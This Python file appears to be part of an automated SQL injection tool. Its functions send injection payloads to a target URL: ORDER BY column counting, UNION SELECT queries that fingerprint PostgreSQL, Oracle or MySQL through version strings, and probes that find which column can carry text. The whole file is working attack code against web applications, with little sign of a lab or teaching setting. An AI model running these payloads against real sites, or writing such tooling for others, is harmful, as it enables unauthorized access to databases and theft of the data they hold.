
def counting_argument(url,injection_point) :  
    
    import requests # import the necessary library 

    error = False # this is for a check value 

    times = 1 # this is for to know how many value we can inject 

    while error == False : # cicle while 

        attack = requests.get(f"{url}{injection_point}'order by {times}--") # this is the injection attack 

        if('Error' in attack.text or 'error' in attack.text) : # if in the text we have an error 

            error = True # the while will finish 

            times -= 1 # it' -1 becouse in the last there is a Error, so the injection value are N-1

            return times # return how many value we can inject
        
        times += 1 # increment if we don't recive error 





def type_database(url,injection_point,count):


    import requests # import the necessary library  
    
    if count == 0 :

        count += 2 # this type of condition it's becouse in a payload has to at least one null in it ( null * (0 + 2) - 1) <--- with this expression in the query will be at least one null

    null = ',null' * (count - 1)  # just to insert the necessary values 
    
    null_postgre = 'null,' * (count - 1) # just to insert the necessary values with postgre

    # POSTGRESQL

    attack = requests.get(f"{url}{injection_point}' union select {null_postgre}version()--") # making the payload to know what kind of database we're attacking 

    if "PostgreSQL" in attack.text : # if it is PostgreSQL

        type = "PostgreSQL" # making the variable with the type of databse 

        return type # return the type of database 

    # ORACLE 

    attack = requests.get(f"{url}{injection_point}' union select banner{null} FROM v$version--") # making the payload to know what kind of database we're attacking 

    if "Oracle" in attack.text : # if it is Oracle

        type = "Oracle" # making the variable with the type of databse 

        return type # return the type of database 

    # MYSQL 

    attack = requests.get(f"{url}{injection_point}' UNION SELECT @@version{null} -- -") # making the payload to know what kind of database we're attacking 
    
    if "Error" in attack.text or "error" in attack.text : # if is an error in the response 

        print("[-] sorry but i don't know what kind of database it is") # alert the error 

        return 0 # return 0 to make an error 
    
    else : # if it will not give an error the type of database is MySQL or Microsoft 

        type = "MySQL and Microsoft" # assign the type of the database at "type"

        return type # return the type of  databse 




def type_argument(url, injection_point, count, type):
    import requests  # import the necessary library

    null = 'null,' * (count)  # just to insert the necessary values

    # Remove the last character if it is a comma
    if null.endswith(','):
        null = null[:-1]

    error = True
    times = 0

    if type == "Oracle":
        while error:
            frase_originale = f"'union select {null} from dual--"
            first_occurrence = frase_originale.find("null")
            second_occurrence = frase_originale.find("null", first_occurrence + times)

            if second_occurrence != -1:
                # Replace 'null' with 'abc' at the second occurrence
                new_phrase = frase_originale[:second_occurrence] + "'abc'" + frase_originale[second_occurrence + len("null"):]

                # Send a request with the new query
                attack = requests.get(f"{url}{injection_point}{new_phrase}")

                if "Error" in attack.text or "error" in attack.text:
                    times += 5
                else:
                    # If the response does not contain errors, stop the loop and return the result
                    error = False
                    return times

    else:
        while error:
            frase_originale = f"'union select {null}--"
            first_occurrence = frase_originale.find("null")
            second_occurrence = frase_originale.find("null", first_occurrence + times)

            if second_occurrence != -1:
                # Replace 'null' with 'abc' at the second occurrence
                new_phrase = frase_originale[:second_occurrence] + "'abc'" + frase_originale[second_occurrence + len("null"):]

                # Send a request with the new query
                attack = requests.get(f"{url}{injection_point}{new_phrase}")

                if "Error" in attack.text or "error" in attack.text:
                    times += 5
                else:
                    # If the response does not contain errors, stop the loop and return the result
                    error = False
                    return times
